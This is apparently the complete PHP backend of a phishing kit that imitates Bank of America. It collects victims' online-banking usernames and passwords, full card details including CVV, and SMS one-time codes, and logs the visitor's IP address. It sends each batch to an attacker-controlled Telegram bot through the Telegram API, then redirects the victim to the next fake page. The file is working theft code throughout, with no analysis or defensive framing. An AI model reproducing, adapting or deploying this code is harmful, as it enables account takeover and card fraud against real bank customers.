<?php 
session_start();
require 'config.php';


function sendTotelegram($data){
    global $bot;
    global $chat_id;

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['user'])){

$msg = "
BOA - New Log 
--------------------------
User: ".$_POST['user']."
pass: ".$_POST['pass']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

header("location: card.php");

}



if(isset($_POST['cc'])){
$_SESSION['_cc'] = $_POST['cc'];
$msg = "
BOA - New CC 
--------------------------
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

header("location: wait.php?next=sms.php");
    
}
    


if(isset($_POST['otp'])){

$msg = "
BOA - New OTP
--------------------------
Cc: ".$_SESSION['_cc']."
Otp: ".$_POST['otp']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

if(isset($_POST['exit'])){
    die(header("location: exit.php"));
}
header("location: wait.php?next=sms.php?error");

}
    



?>